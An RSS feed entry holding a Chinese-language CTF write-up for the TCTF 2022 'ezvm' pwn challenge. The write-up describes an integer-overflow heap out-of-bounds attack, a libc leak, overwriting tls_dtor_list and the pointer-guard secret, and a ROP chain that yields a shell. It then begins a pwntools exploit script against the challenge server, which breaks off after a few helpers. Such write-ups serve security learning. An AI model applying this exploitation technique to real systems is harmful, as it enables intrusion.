<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>我他喵的</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Tue, 20 Sep 2022 14:08:33 +0800</pubDate>
        <lastBuildDate>Tue, 20 Sep 2022 14:08:33 +0800</lastBuildDate>
        <category>writeup</category>
        <category>learning</category>
        <category>pwn</category>
        <category>Hello World</category>
        <category>Learning</category>
        <category>二进制学习</category>
        <category>逆向</category>
        <category>reverse</category>
        <item>
            <guid isPermalink="true">http://example.com/2022/09/20/tctf2022ezvm/</guid>
            <title>tctf2022ezvm</title>
            <link>http://example.com/2022/09/20/tctf2022ezvm/</link>
            <category>writeup</category>
            <pubDate>Tue, 20 Sep 2022 14:08:33 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h3&gt;
&lt;p&gt;在申请 memery 的时候存在整数溢出，程序虽然会检测到，但是允许我们进行一次的整数溢出申请，这样实际的 memery 的 count 很大，但是 chunk 的大小远小于这个值，造成了堆块的越界读写。&lt;br&gt;
当我们申请一个很大的堆块，会在 libc 附近分配，配合越界写，我们就可以修改 tls_dtor_list, 以及 secret 的值。&lt;br&gt;
chunk 的释放冲 i 性能申请没有对其进行清空，所以，我们申请出一个 largebin 范围的 chunk，然后释放，这样再次将其申请出来的时候，在 memery [1] 会存有一个指针，就可以知道 libc 的及地址了。将这个数据存在这个 chunk+0x1d0 附近，在这里写一些数据，拼接出 mov_r_i 的指令，以及一个 jmp 到低地址的指令 释放。然后我们我们这次的时候，codesize 为 0x200, 就会将刚写进去的拼接指令，放到 code 的靠后的位置，我们只需要在 code 的最开始写一个 jmp，让 vm 跳到我们刚写的拼接指令哪里，将 libc 的放入寄存器。同时这一次的 memerycount 要发生溢出，并且在 libc 附近申请到一个 chunk. 这样根据偏移量，结合程序的一些基本运算，就得到了函数地址，gadget 地址。然后修改 tls_dtor_list 到 heap 上，并在哪里填充 rop, 以及修改 searet 的值。最后触发程序错误，直接 exit，getshell&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;224&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;225&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;226&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;231&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;232&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;233&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;235&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;237&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;238&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;239&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;240&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;241&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;242&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;243&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;244&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;245&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;246&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;247&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;248&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;249&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;252&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;253&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;257&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;258&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;259&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;260&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;262&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;263&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;264&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;265&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;266&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;267&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;268&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;269&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;270&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;271&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;272&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;273&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;274&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;275&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;276&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;277&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;278&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;279&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;280&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;281&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;282&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;283&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;284&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;285&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;286&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;287&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;288&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;289&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;291&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;292&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;293&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;294&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;295&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;296&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;297&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;298&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;299&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;300&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;301&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;302&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;303&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;304&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;306&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=process(&amp;#x27;./ezvm&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;202.120.7.210&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40241&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code =&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;push&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rig&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p8(rig)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pop&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rig&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p8(rig)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	